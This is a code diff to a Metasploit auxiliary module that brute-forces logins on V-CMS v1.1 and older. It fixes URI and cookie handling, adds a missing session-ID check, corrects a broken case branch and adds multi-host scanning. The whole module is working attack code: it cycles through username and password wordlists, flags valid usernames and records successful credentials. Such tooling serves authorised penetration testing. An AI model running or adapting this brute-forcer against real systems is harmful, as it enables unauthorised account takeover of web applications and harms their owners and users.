@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -10,14 +10,15 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'V-CMS Login Utility',
       'Description'    => %q{
-          This module attempts to authenticate to an English-based V-CMS login interface.
-        It should only work against version v1.1 or older, because these versions do not
-        have any default protections against bruteforcing.
+        This module attempts to authenticate to an English-based V-CMS login interface. It
+        should only work against version v1.1 or older, because these versions do not have
+        any default protections against bruteforcing.
       },
       'Author'         => [ 'sinn3r' ],
       'License'        => MSF_LICENSE
@@ -31,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
           File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
         OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
-        OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/vcms2/'])
+        OptString.new('TARGETURI', [true, 'The URI path to V-CMS', '/vcms2/'])
       ], self.class)
   end
 
@@ -39,11 +40,11 @@ class Metasploit3 < Msf::Auxiliary
   def get_sid
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => @uri.path
+      'uri'    => @uri
     })
 
     # Get the PHP session ID
-    m = res.headers['Set-Cookie'].match(/(PHPSESSID=.+);/)
+    m = res.get_cookies.match(/(PHPSESSID=.+);/)
     id = (m.nil?) ? nil : m[1]
 
     return id
@@ -52,6 +53,11 @@ class Metasploit3 < Msf::Auxiliary
   def do_login(user, pass)
     begin
       sid = get_sid
+      if sid.nil?
+        vprint_error("#{peer} - Failed to get sid")
+        return :abort
+      end
+
       res = send_request_cgi({
         'uri'    => "#{@uri}process.php",
         'method' => 'POST',
@@ -62,16 +68,14 @@ class Metasploit3 < Msf::Auxiliary
           'sublogin' => '1'
         }
       })
-
       location = res.headers['Location']
-
       res = send_request_cgi({
         'uri' => location,
         'method' => 'GET',
         'cookie' => sid
       })
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-      vprint_error("#{@peer} - Service failed to respond")
+      vprint_error("#{peer} - Service failed to respond")
       return :abort
     end
 
@@ -86,9 +90,9 @@ class Metasploit3 < Msf::Auxiliary
       when /User name already confirmed/
         return :skip_user
       when /Invalid password/
-        vprint_status("#{@peer} - Username found: #{user}")
-      else /\<a href="process\.php\?logout=1"\>/
-        print_good("#{@peer} - Successful login: \"#{user}:#{pass}\"")
+        vprint_status("#{peer} - Username found: #{user}")
+      when /\<a href="process\.php\?logout=1"\>/
+        print_good("#{peer} - Successful login: \"#{user}:#{pass}\"")
         report_auth_info({
           :host        => rhost,
           :port        => rport,
@@ -107,11 +111,14 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     @uri = normalize_uri(target_uri.path)
-    @uri.path << "/" if @uri.path[-1, 1] != "/"
-    @peer = "#{rhost}:#{rport}"
+    @uri << "/" if @uri[-1, 1] != "/"
 
+    super
+  end
+
+  def run_host(ip)
     each_user_pass { |user, pass|
-      vprint_status("#{@peer} - Trying \"#{user}:#{pass}\"")
+      vprint_status("#{peer} - Trying \"#{user}:#{pass}\"")
       do_login(user, pass)
     }
   end
